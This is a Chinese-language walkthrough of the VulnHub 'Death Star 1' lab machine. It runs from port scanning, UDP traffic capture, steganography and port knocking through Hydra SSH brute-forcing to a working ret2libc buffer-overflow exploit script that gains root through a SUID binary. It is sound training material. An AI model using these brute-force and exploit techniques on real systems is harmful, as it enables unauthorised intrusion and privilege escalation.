靶机地址: [https://www.vulnhub.com/entry/death-star-1,477/](https://www.vulnhub.com/entry/death-star-1,477/)

![image-20250515144334733](https://7r1UMPH.top/image/20250515144342235.webp)

### 1. 主机发现与端口扫描

首先，使用 `arp-scan` 发现靶机 IP 地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ sudo arp-scan -l     
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.210 08:00:27:b2:99:5a       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ee:d6:af       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.977 seconds (129.49 hosts/sec). 4 responded
```

靶机 IP 为 `192.168.205.210`。

尝试进行全端口快速扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ nmap -p- --min-rate 10000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:32 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00051s latency).
All 65535 scanned ports on 192.168.205.210 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
```

没有扫描到开放端口，所有端口状态为 `ignored` 或 `filtered`。
确认主机是否连通：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ ping 192.168.205.210
PING 192.168.205.210 (192.168.205.210) 56(84) bytes of data.
64 bytes from 192.168.205.210: icmp_seq=1 ttl=64 time=0.475 ms
...
--- 192.168.205.210 ping statistics ---
11 packets transmitted, 11 received, 0% packet loss, time 10231ms
rtt min/avg/max/mdev = 0.285/0.325/0.475/0.050 ms
```

主机是连通的。这表明可能有防火墙过滤了 TCP 端口扫描。

尝试使用 `-Pn` (跳过主机发现) 和其他扫描技术：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ sudo nmap -Pn -p- --min-rate 1000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:44 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00038s latency).
All 65535 scanned ports on 192.168.205.210 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 131.46 seconds
```

尝试 ACK 扫描 (`-sA`) 来探测防火墙规则集：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ sudo nmap -Pn -sA -p- --min-rate 1000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:47 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00038s latency).
All 65535 scanned ports on 192.168.205.210 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 131.40 seconds
```

结果依旧。尝试 FIN, Xmas, Null 隐蔽扫描：

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sF -p- --min-rate 1000 192.168.205.210 && \
sudo nmap -Pn -sX -p- --min-rate 1000 192.168.205.210 && \
sudo nmap -Pn -sN -p- --min-rate 1000 192.168.205.210
# ... (三次扫描结果类似，均为 open|filtered 或 filtered)
```

TCP 端口扫描似乎都无法穿透防火墙。尝试 UDP 扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ nmap -sU --top-ports 100 192.168.205.210                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:40 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00035s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 103.11 seconds
```

UDP 端口 68 (DHCP客户端) 通常不是可利用的入口。

尝试分片扫描 (`-f`) 和源端口伪装 (`-g 53`)：

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sS -f -p- --min-rate 1000 192.168.205.210
# ... (结果 filtered)
                                                                      
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sS -g 53 -p- --min-rate 1000 192.168.205.210
# ... (结果 filtered)
```

所有 TCP 扫描尝试均失败，看来需要另辟蹊径。

### 2. 流量捕获与信息获取

既然主动扫描效果不佳，尝试捕获靶机发出的流量，看是否有线索。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i eth0 host 192.168.205.210 -nn                                    
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
03:12:01.447736 IP 192.168.205.210.44226 > 255.255.255.255.160: UDP, length 472
03:12:01.447804 IP 192.168.205.210.44226 > 255.255.255.255.160: UDP, length 472
03:12:01.448295 IP 192.168.205.210.53472 > 255.255.255.255.357: UDP, length 97
03:12:01.448342 IP 192.168.205.210.53472 > 255.255.255.255.357: UDP, length 97
03:12:20.192762 IP 192.168.205.210.68 > 192.168.205.254.67: BOOTP/DHCP, Request from 08:00:27:b2:99:5a, length 300
03:12:20.192956 IP 192.168.205.254.67 > 192.168.205.210.68: BOOTP/DHCP, Reply, length 300
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel
```

发现靶机向广播地址的 UDP 端口 160 和 357 发送数据。使用 `nc` 监听这两个端口：

监听 UDP 160 端口：

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -ulnp 160 -vv
listening on [any] 160 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 44380

Thanks to the successful Operation Skyhook, the Rebel Alliance
got some plans for the new weapon of the Galactic Empire. We
know that there is a small opening that we can explore through a
thermal exhaust that is directly connected to the Main Reactor of the
Death Star. The superlaser takes 1440 minutes to reload.
It is very important to observe 'this window' in order to recover the blueprint.
This is because, it is only possible to make an attempt every 60 seconds.
^C sent 0, rcvd 472

# 翻译
得益于“天钩行动”的成功，义军同盟
获得了一些银河帝国新武器的图纸。我们
知道有一个小开口，可以通过一个热排气口进行探索，这个排气口直接连接到死星的主反应堆。超级激光器需要1440分钟才能重新装填。
为了获取蓝图，观察“这个窗口”至关重要。
这是因为，每60秒只能尝试一次。
```

监听 UDP 357 端口：

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -ulnp 357 -vv
[sudo] password for kali: 
listening on [any] 357 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 45629


Code to access the Death Star Blueprint
within the time it takes to reload is:  DS-1@OBS     

^C sent 0, rcvd 97
                   
# 翻译
在重新加载所需的时间内访问死星蓝图的代码是：DS-1@OBS
```

从 UDP 160 端口的信息中提取到数字 `1440` 和 `60`。从 UDP 357 端口的信息中获取到访问代码 `DS-1@OBS`。
提示要观察一个 "窗口"，结合数字，猜测这可能是端口号。

尝试扫描这些数字对应的 UDP 端口：

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sU -p1440,24,60 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 03:39 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00041s latency).

PORT     STATE  SERVICE
24/udp   closed priv-mail
60/udp   closed unknown
1440/udp open   eicon-slp
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

UDP 1440 端口开放。

### 3. 获取图片与信息提取

向 UDP 1440 端口发送之前获取的代码 `DS-1@OBS`：

```bash
┌──(kali㉿kali)-[~]
└─$ echo "DS-1@OBS" | sudo nc -u 192.168.205.210 1440 > 1440.txt
```

查看接收到的内容，发现是 Base64 编码的数据，开头为 `/9j/4AAQSkZJRg`，这是 JPEG 文件的典型特征。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 1440.txt | base64 -d > 1440.jpg
```

(注: 实际操作中应确保数据完整接收，若图片不完整可能导致后续步骤失败。可以使用 `nc -u -w1` 设置超时。)

打开图片 `1440.jpg`：
![image-20250515154643417](https://7r1UMPH.top/image/20250515154722764.webp)
图片上显示解锁代码：**197719801983**。

尝试对图片进行隐写分析。`strings` 和 `binwalk` 未发现明显线索。使用 `steghide`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ steghide extract -sf 1440.jpg
Enter passphrase: DS-1@OBS
wrote extracted data to "openTheExhaust.txt".
                 
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat openTheExhaust.txt       
Each segment of the "unlock code" can only contain 3 characters sent in sequence to unlock port 10110.
                   
# 翻译
“解锁码”每段只能包含3个字符，按顺序发送即可解锁10110端口。
```

使用之前获取的 `DS-1@OBS` 作为密码，成功提取出 `openTheExhaust.txt` 文件。内容提示解锁代码每段3个字符，用于解锁 10110 端口。

### 4. 端口敲门与 SSH 登录

根据提示，将解锁代码 `197719801983` 分割成 `197`, `719`, `801`, `983`，并进行端口敲门：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ knock 192.168.205.210 197 719 801 983
```

敲门后，扫描目标端口 10110：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p10110 -sT -sU 192.168.205.210 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:31 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00035s latency).

PORT      STATE  SERVICE
10110/tcp open   nmea-0183
10110/udp closed nmea-0183
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

TCP 10110 端口已开放。探测服务版本：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p10110 -sV 192.168.205.210    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:32 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00033s latency).

PORT      STATE SERVICE VERSION
10110/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

端口 10110 运行的是 OpenSSH 6.6.1p1。尝试 SSH 登录，此时我们没有任何凭据，先用 root 试试：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh root@192.168.205.210 -p 10110
The authenticity of host '[192.168.205.210]:10110 ([192.168.205.210]:10110)' can't be established.
ECDSA key fingerprint is SHA256:oXn/1IjNjNv4INght0MV2FrWXVvTB4QNM9Bx1aRRLos.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.205.210]:10110' (ECDSA) to the list of known hosts.

# ... ASCII Art ...
                                                                          
Devoloped by Galen Walton Erso
System's user: erso
Pass Hint: My wife's first name plus the year (BBY) she died.

Glory to the Empire - Project DS-1: Orbital Battle Station


root@192.168.205.210's password: 
```

SSH 登录提示：

*   用户名: `erso`
*   密码提示: "我妻子的名字加上她去世的年份 (BBY)。" (My wife's first name plus the year (BBY) she died.)

根据星球大战背景，Galen Erso 的妻子是 Lyra Erso。
![image-20250515163544826](https://7r1UMPH.top/image/20250515163545042.webp)

她去世的年份是 13 BBY (Before Battle of Yavin)。
![image-20250515163625883](https://7r1UMPH.top/image/20250515163626074.webp)

构造可能的密码列表：

```
Lyra13
lyra13
LyraErso13
lyraerso13
Lyraerso13
lyraErso13
Lyra13BBY
lyra13BBY
Lyra13bby
lyra13bby
Lyra-13
lyra-13
Lyra_13
lyra_13
Lyra
lyra
Erso
```

使用 Hydra 进行爆破：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l erso -P pass ssh://192.168.205.210 -s 10110 -I -u -f -e nsr -t 64    
\Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-15 04:46:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 20 login tries (l:1/p:20), ~1 try per task
[DATA] attacking ssh://192.168.205.210:10110/
[10110][ssh] host: 192.168.205.210   login: erso   password: lyra13
[STATUS] attack finished for 192.168.205.210 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-15 04:46:22
```

成功爆破出密码为 `lyra13`。
登录 SSH：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh erso@192.168.205.210 -p 10110
# ... (Login banner) ...
erso@deathStar1:~$ id
uid=1000(erso) gid=1000(erso) groups=1000(erso)
```

成功登录用户 `erso`。

### 5. 提权

查看 `sudo` 权限和家目录下的文件：

```bash
erso@deathStar1:~$ sudo -l
sudo: unable to resolve host deathStar1
[sudo] password for erso: 
Sorry, user erso may not run sudo on deathStar1.
erso@deathStar1:~$ ls -al
total 28
drwxr-xr-x 3 erso erso 4096 May  3  2020 .
drwxr-xr-x 3 root root 4096 May  3  2020 ..
lrwxrwxrwx 1 root root    9 May  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 erso erso  220 May  3  2020 .bash_logout
-rw-r--r-- 1 erso erso 3631 May  3  2020 .bashrc
drwx------ 2 erso erso 4096 May  3  2020 .cache
-rw-r--r-- 1 erso erso  690 May  3  2020 .profile
-rw------- 1 erso erso  369 May  3  2020 warning.txt
erso@deathStar1:~$ cat warning.txt 
Message from GALEN ERSO:
This is your chance. Destroy the plans of the Galactic Empire. I know that Lord Vader will not like this at all. But, this will be my chance for redemption. I hope you have enough knowledge to help destroy this new weapon.
Explore the system and get 'root access' to read the secret message located at '/root/message.txt'. 
Hack or fail!!
```

提示 root flag 在 `/root/message.txt`。

查找 SUID 文件：

```bash
erso@deathStar1:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mtr
/usr/bin/pkexec
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/su
/bin/ping6
/bin/fusermount
/bin/dartVader  <-- 可疑
/bin/umount
/bin/mount
/bin/ping
```

`/bin/dartVader` 是一个可疑的 SUID 文件，与靶机主题相关。

分析 `/bin/dartVader`：

```bash
erso@deathStar1:~$ ls -l /bin/dartVader
-rwsr-xr-x 1 root root 7338 Nov  7  2019 /bin/dartVader
erso@deathStar1:~$ file /bin/dartVader
/bin/dartVader: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped
erso@deathStar1:~$ /bin/dartVader
dartVader: Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...
# 翻译: 达斯·维达：你拥有未来。别做拉默，去探索并真正学习……
```

这是一个 32 位 SUID 可执行文件。查看其字符串：

```bash
erso@deathStar1:~$ strings /bin/dartVader
# ... (部分输出) ...
strcpy
# ...
game3.c
# ...
```

发现 `strcpy` 函数和源文件名 `game3.c`，这强烈暗示存在缓冲区溢出漏洞。

测试缓冲区溢出：

```bash
erso@deathStar1:~$ /bin/dartVader aaaaaaaaa
erso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
erso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

输入大量 'a' 导致段错误，确认存在缓冲区溢出。

将 `/bin/dartVader` 文件传输到本地 Kali 进行分析：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ scp -P 10110 erso@192.168.205.210:/bin/dartVader .
# ... (传输成功) ...
```

使用 IDA Pro 反编译 `dartVader`：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[64]; // [esp+10h] [ebp-40h] BYREF

  if ( argc == 1 )
    errx(1, "Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...\n");
  return (int)strcpy(dest, argv[1]);
}
```

`dest` 缓冲区大小为 64 字节。`strcpy` 将 `argv[1]` (命令行第一个参数) 复制到 `dest`，没有长度检查。

在 GDB 中确定 EIP 覆盖的精确偏移量：

1.  生成一个唯一的非重复字符串作为输入。
2.  在 GDB 中运行程序，使用该字符串作为参数。
3.  当程序崩溃时，查看 EIP 寄存器的值。
4.  使用 `pattern_offset.rb` (或类似工具) 找到该值在原始字符串中的偏移。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gdb dartVader
(gdb) set disassembly-flavor intel
(gdb) run $(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 80) 
# 或者手动输入 pattern_create 生成的字符串，如 Aa0Aa1...
Starting program: /mnt/hgfs/gx/dartVader Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) info registers eip
eip            0x63413563          0x63413563
```

EIP 被 `0x63413563` (ASCII "c5Ac") 覆盖。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563 -l 80
[*] Exact match at offset 76
```

偏移量为 76 字节。验证：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gdb dartVader
(gdb) run $(python2 -c 'print "A"*76 + "BBBB"')
Starting program: /mnt/hgfs/gx/dartVader $(python2 -c 'print "A"*76 + "BBBB"')
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers eip
eip            0x42424242          0x42424242
```

EIP 成功被 `BBBB` (0x42424242) 覆盖。

检查系统保护机制：

* ASLR (地址空间布局随机化):

  ```bash
  erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space
  2
  ```

  ASLR 完全开启。

* NX (No-eXecute bit):

  ```bash
  erso@deathStar1:~$ readelf -W -l /bin/dartVader 
  # ...
  Program Headers:
    Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  # ...
    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10 
  # ...
  ```

  `GNU_STACK` 标志为 `RW`，表示栈区可读可写但不可执行，NX bit 开启。

由于 ASLR 和 NX 开启，直接注入 shellcode 到栈上执行不可行。采用 Ret2Libc (返回到 libc) 技术。
由于是 32 位系统，libc 地址虽然随机化，但范围相对较小，可以尝试爆破 libc 基址。

获取 libc 中 `system`、`exit` 函数和 `"/bin/sh"` 字符串的偏移量：

```bash
erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system@"
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
# system_offset = 0x00040310

erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit@"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
# exit_offset = 0x00033260

erso@deathStar1:~$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 162d4c /bin/sh
# sh_offset = 0x162d4c
```

多次运行 `ldd /bin/dartVader` 观察 libc 基址变化范围，例如：

```bash
erso@deathStar1:~$ ldd /bin/dartVader 
        linux-gate.so.1 =>  (0xb7793000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75d7000) # <--- libc 基址
        /lib/ld-linux.so.2 (0xb7795000)
```

基址大约在 `0xb75xxxxx` 到 `0xb77xxxxx` 之间。

编写爆破脚本 `exp.py`：

```python
#!/usr/bin/env python3

from struct import pack
from subprocess import call

# 已知偏移量
system_offset = 0x40310
exit_offset = 0x33260
sh_offset = 0x162d4c

# 固定目标程序路径
app = b"/bin/dartVader"

# 缓冲区填充长度（根据你的溢出点调整）
offset = b"A" * 76

def try_exploit(libc_base):
    system = pack('<I', libc_base + system_offset)
    exit_func = pack('<I', libc_base + exit_offset)
    sh_str = pack('<I', libc_base + sh_offset)
    payload = offset + system + exit_func + sh_str
    ret = call([app, payload])
    return ret == 0

# 爆破 libc 地址范围（每次增加 0x1000）
base_address = 0xb7500000
end_address = 0xb7700000

print("[*] Starting brute-force attack...")

found = False
for addr in range(base_address, end_address, 0x1000):
    print("[+] Trying libc base: 0x%08x" % addr)
    if try_exploit(addr):
        print("[+] Exploit successful!")
        found = True
        break

if not found:
    print("[-] Brute-force failed.")
```

在靶机上运行此脚本（或类似逻辑的脚本）。在爆破过程中，当 libc 基址正确时，`system("/bin/sh")` 会被调用，从而获得 root shell。
用户在 `0xb7564000` 这个基址附近（或就是这个基址）获得了成功。

```bash
erso@deathStar1:~$ python3 exp.py 
# ... (爆破过程) ...
[+] Trying libc base: 0xb7564000 
# (此处脚本可能因 system("/bin/sh") 调用而暂停，或者shell直接接管了终端)
# id
uid=1000(erso) gid=1000(erso) euid=0(root) groups=0(root),1000(erso)
# cat /root/message.txt
Art by Shanaka Dias
                    .==.
                   ()''()-.
        .---.       ;--; /
      .'_:___". _..'.  __'.
      |__ --==|'-''' \'...;
      [  ]  :[|       |---\
      |__| I=[|     .'    '.
      / / ____|     :       '._
     |-/.____.'      | :       :
snd /___\ /___\      '-'._----'

-------------------------------------

Congratulations!!
You helped me destroy the empire's weapon.

-------------------------------------
If you had fun, love to get your feedback.
Send me a tweet @mrhenrike  ;)

Until the next VM and "May the force be with you".
```

### 总结

该靶机涉及了多种渗透技巧：

1.  通过流量捕获发现隐藏的 UDP 通信端口。
2.  解析 UDP 消息获取线索和密码。
3.  Base64 解码和图片隐写（steghide）获取进一步指令。
4.  端口敲门技术解锁新的服务端口。
5.  SSH 弱密码爆破（基于提示信息）。
6.  Linux SUID 二进制文件提权，通过缓冲区溢出（strcpy）和 Ret2Libc 技术绕过 ASLR 和 NX 保护，最终获得 root 权限。

整个过程对信息收集、线索关联和漏洞利用能力都有一定的考验。